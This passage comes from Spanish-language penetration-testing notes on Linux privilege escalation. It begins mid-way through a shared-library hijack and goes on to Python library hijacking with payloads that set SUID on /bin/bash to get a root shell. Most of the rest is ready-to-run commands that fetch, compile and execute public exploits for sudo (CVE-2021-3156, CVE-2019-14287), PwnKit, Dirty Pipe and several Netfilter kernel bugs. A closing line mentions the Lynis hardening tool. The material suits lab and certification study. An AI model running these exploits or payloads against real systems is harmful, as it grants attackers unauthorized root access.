gcc [ARCHIVO].c -fPIC -shared -o [LIBRERIA_VULNERABLE] # /development/libshared.so
```

Y ya solo quedaría ejecutar le binario legítimo

# Python hijacking
Este lo tenemos bastante bien explicado en los apuntes ya pero por ampliar cosas:
```
pip3 show psutil
```
esto para una vez que sepamos que función se importa para saber que desde esa lista a las enumeradas hacia arriba son en las que hay que buscar para escribir y poner nuestra función malicios.

Importante que si cuando usamos esto que tenemos en los apuntes:
```
python3 -c 'import sys; print(sys.path)'
```
Nos da un `' '` que es el directorio actual podremos hacerlo desde donde queramos

Payloads de secuestro:
```
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

```
import os
os.system("chmod u+s /bin/bash")
```

Y ejecutamos (si tenia el `' '` nos lo llevamos a la carpeta del propio usuario) ya que python mete por defecto en su path el home:
```
sudo /usr/bin/python3 /RUTA/AL/SCRIPT
```

Y nos dará un error, pero si vemos los permisos de /bin/bash veremos que tiene SUID, por lo que ejecutamos lo siguiente para obtener la shell como root:
```
/bin/bash -p
```

# 0-Zero Days
## Sudo
Ver versión de Sudo
```
sudo -V | head -n1
```
Si es una versión vulnerable, por ejemplo:
### CVE-2021-3156
https://github.com/blasty/CVE-2021-3156
```
Olvidix@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
Olvidix@nix02:~$ cd CVE-2021-3156
Olvidix@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Y lo usamos:
```
./sudo-hax-me-a-sandwich
```
Este pedirá que le metas de argumento un numero depende de la versión del S.O, vamos a verlo

Ver la versión del Sistema Operativo:
```
cat /etc/lsb-release
```

Por lo cual lo usamos con la 1:
```
./sudo-hax-me-a-sandwich 1
```

### CVE-2019-14287
https://www.sudo.ws/security/advisories/minus_1_uid/
Este es un bypass.
El comando `sudo` permite especificar el usuario por su nombre o por su **UID** (User ID) usando el símbolo `#`.

Se supone que si en ese ID ponemos un número que no existe debería de dar error, pero esta versión en concreto no. Internamente, el sistema trata el `-1` como un error o un valor no configurado, y por defecto, **lo convierte en `0`**

Por lo que sabiendo esto podemos hacer algo tan fácil como:
```
sudo -u#-1 id
```

## Polkit
Polkit contiene en si tres programas diferentes que más o menos conocemos ya:
- `pkexec`- Ejecuta un programa con los derechos de otro usuario o con derechos de administrador.
- `pkaction`- se puede utilizar para mostrar acciones
- `pkcheck`- Esto se puede utilizar para comprobar si un proceso está autorizado para una acción específica.
La que nos interesa es la de psexec:
```
pkexec -u <user> <command>
```
CVE-2021-4034 - Conocida como Pwnkit

Para descargarlo:
```
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```

Y lo ejecutamos:
```
./poc
```

## Dirty Pipe
[CVE-2022-0847](https://dirtypipe.cm4all.com/) , técnicamente es muy muy similar a la [DirtyCow](https://dirtycow.ninja/)

Descargamos:
```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh # Recordad de mejor compilar en la maquina victima
```

Y ejecutamos:
```
./exploit-1
```

Con el exploit-2 podemos ejecutar SUID con privilegios de root que es lo chulo. Primero listamos los binarios con esos permisos:
```
find / -perm -4000 2>/dev/null
```

Luego elegimos el que mejor nos convenga y lo usamos:
```
./exploit-2 /usr/bin/sudo
```

## Netfilter (Más Exploits de kernel)
En 2021 ( [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555) ), 2022 ( [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015) ) y también en 2023 ( [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233) ), se encontraron varias vulnerabilidades que podrían conducir a la escalada de privilegios.
### CVE-2021-22555
Versiones del kernel vulnerables: 2.6 - 5.11
```
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
 ./exploit
```

### CVE-2022-25636
Versiones del kernel vulnerables: 5.4 - 5.6.10
```
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

### CVE-2023-32233
Versiones del kernel vulnerables: < 6.3.1
```
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

# Herramienta de hardering
 [Lynis](https://github.com/CISOfy/lynis). This tool audits the current configuration of a system and provides additional hardening tips
 Usage:
 ```
 ./lynis audit system
 ```